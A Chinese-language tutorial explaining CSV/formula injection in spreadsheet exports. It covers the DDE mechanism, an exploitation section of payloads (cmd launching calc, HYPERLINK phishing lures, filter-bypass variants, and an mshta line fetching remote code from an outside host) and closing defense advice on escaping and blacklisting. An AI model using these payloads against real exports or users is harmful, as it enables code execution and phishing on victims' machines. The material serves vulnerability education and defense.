# CSV注入漏洞的原理及利用

## 漏洞简介

CSV 注入(CSV Injection）漏洞通常会出现在有导出文件 (.csv/.xls) 功能的网站中。当导出的文件内容可控时，攻击者通常将恶意负载（公式）注入到输入字段中，用户导出文件打开后，EXCEL 会调用本身的动态功能，执行攻击者的恶意代码，从而控制用户计算机。

## 漏洞原理

`=、-、@`这样的符号也会被 excel 解析为公式

DDE 是 Windows 下进程间通信协议，是一种动态数据交换机制，使用 DDE 通讯需要两个 Windows 应用程序，其中一个作为服务器处理信息，另外一个作为客户机从服务器获得信息。DDE 支持 Microsoft Excel，LibreOffice 和 Apache OpenOffice。 Excel、Word、Rtf、Outlook 都可以使用这种机制，根据外部应用的处理结果来更新内容。因此，如果我们制作包含 DDE 公式的 CSV 文件，那么在打开该文件时，Excel 就会尝试执行外部应用。

调用 DDE 需要在`文件->选项->信任中心->信任中心设置->外部内容`中开启：

![image-20240322194314329](C:\Users\Abs1nThe\AppData\Roaming\Typora\typora-user-images\image-20240322194314329.png)

## 漏洞利用

```
=cmd|'0'!f
=1+cmd|' /C calc'!f
+1+cmd|' /C calc'!f
=HYPERLINK("https://www.baidu.com/")
=HYPERLINK("https://www.baidu.com/","优惠券领取！")
+HYPERLINK("https://www.baidu.com/","优惠券领取！")
=1+cmd|'/c mshta.exe http://192.168.206.128:8080/csv'!f
+1+cmd|'/c mshta.exe http://127.0.0.1'!f

在等于号被过滤时，可以通过运算符+-的方式绕过；
-3+2+cmd |’ /C calc’ !f
参数处输入以下 Payload，%0A被解析，从而后面的数据跳转到下一行
%0A-3+3+cmd|' /C calc'!f
导出文件为 csv 时，若系统在等号=前加了引号’过滤，则可以使用分号绕过，分号可分离前后两部分内容使其分别执行
;-3+3+cmd|' /C calc'!f
其他常用 Payload
@SUM(cmd|'/c calc'!f)
@ABS(cmd|'/c calc'!f)
=wt|'calc'!f
=wt|calc!f

```

![image-20240322194948319](C:\Users\Abs1nThe\AppData\Roaming\Typora\typora-user-images\image-20240322194948319.png)

## 漏洞防御

这种攻击很难缓解，并且从许多漏洞赏金计划中都明确禁止了这种攻击。要对其进行修复，请确保没有任何单元格以下列任何字符开头：

```
等于（“ =”）
加号（“ +”）
减号（“-”）
在 （”@”）
```

开发人员可以在包含此类字符的单元格的开头添加撇号（’），添加撇号（’）会告诉 excel 该单元格不包含公式。

相对完整的防御措施如下：

1）一般的防御手段为：在生成电子表格时，以任何危险符号开头的字段应该以单引号、撇号（'）字符或空格作为前缀，确保单元格不被解释为公式，但存在可能被绕过的风险；

2）更好的防御手段为，根据业务需求控制用户输入为字母数字字符，或黑名单过滤=或-号开头的单元格数据，过滤=(-)cmd或=(-)HYPERLINK或concat等。
97/article/details/124524002